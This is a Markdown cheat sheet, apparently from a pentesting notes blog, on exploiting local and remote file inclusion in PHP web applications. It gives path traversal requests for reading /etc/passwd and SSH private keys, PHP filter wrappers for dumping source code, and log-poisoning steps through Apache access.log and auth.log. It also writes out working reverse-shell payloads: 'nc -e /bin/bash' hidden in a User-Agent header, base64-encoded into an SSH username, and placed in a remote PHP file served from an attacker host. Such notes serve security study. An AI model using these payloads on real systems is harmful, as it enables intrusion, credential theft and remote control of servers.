# [](#header-4)Local file inclusion
**LFI** is the process to include files locate in the server through the exploiting of vulnerable inclusion.
For example:
{% highlight plain %}
http://localhost/example.php?file=../../../../../../../etc/passwd
{% endhighlight %}

With the terminal we can check easily:
{% highlight plain %}
> curl -s "http://localhost/example.php?file=/etc/passwd"
{% endhighlight %}
##### **-s**: no verbose

We can check some important files:
- **/home/user/.ssh/id_rsa ->** check credentials for a ssh connection, with **ssh2john** we can break any ssh password if its weak or we have it in a dictionary.
- **/proc/sched_debug ->**  show many running scripts
- **/proc/net/fib_trie ->** check network interfaces (with *grep -i  "host local" -B 1* we can get local ip).
- **/proc/net/tcp ->** check port. The last four digits from the second column (rem_address), if we add a **0x** in Python before we can get the port (its common to not get ports like 80 here).

### [](#header-4) Directory Path Traversal
If the web is sanitaze with only one path allowed, we can move using **../**:
{% highlight plain %}
> curl -s "http://localhost/example.php?file=../../../../../../../etc/passwd"
{% endhighlight %}

The web can set and extension to the end of the path, we can escape than with: **%00** at the end of the search.

#### Wrappers
Help to escape LFI sanitazer. For example:
- **?file=file:///etc/passwd ->** get the file.
- **?file=php:///filter/convert.base64-encode/resource=file.php ->** give all the content file (including comments) in base64 (useful to get the whole source code).

### [](#header-4) Log Poisoning
Change logs in order to recreate a RCE.

#### Reverse Shell
We can execute code accesing **/proc/self/environ**. We can modify the header in burpsuite to add:
{% highlight plain %}
<?passthru('nc -e /bin/bash <ip> <port>');?>
{% endhighlight %}
To execute the reverse shell.

#### Apache2
In **/var/log/apache2/access.log** we can manipulate the user agent that the log is currently saving in the logs with curl. For example:
{% highlight plain %}
> curl -s -H "User-Agent: <¿php system('whoami'); ?>" "http://localhost/example.php?file=/var/log/apache2/access.log"
{% endhighlight %}
Now we can execute code in the system.

Also, we can try to login (for example with ssh). **auth.log** will save the login attempt, if we execute the page after the login we will execute the script.
##### Maybe we need to encode the payload to base64

Another example is the **/var/log/auth.log**. We can try to log in by ssh with and invalid user and see that all the trys are been saving in the log.
If we log as a command, execute the log (loading with curl or in the web with LFI) we can execute the command and get a **reverse shell**:
- First we encode the connection (with netcat).
{% highlight plain %}
> echo 'nc -e /bin/bash 127.0.0.1:443' | base64; echo
  bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMTo0NDMK
{% endhighlight %}
- Then we send this "user" to the log:
{% highlight plain %}
> ssh '<¿php system("echo bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMTo0NDMK | base64 -d | bash"); ?>'@127.0.0.1 
{% endhighlight %}
Then we will try to log in with any password. Now we just need to reload the log in the web, then the code is executed.
{% highlight plain %}
> curl -s -H "User-Agent: <¿php system('whoami'); ?>" "http://localhost/example.php?file=/var/log/auth.log"
{% endhighlight %}


# [](#header-4)Remote File Inclusion (RFI)
Load files into the server.

We can create a plain file (**.txt**) with a php content:
{% highlight plain %}
<?php
  passthru('nc -e /bin/sh 192.168.1.134 9000');
?>
{% endhighlight %}

Then we change the url with:
{% highlight plain %}
...?index=http://<ip>/revershell.txt
{% endhighlight %}
And then we can execute code.
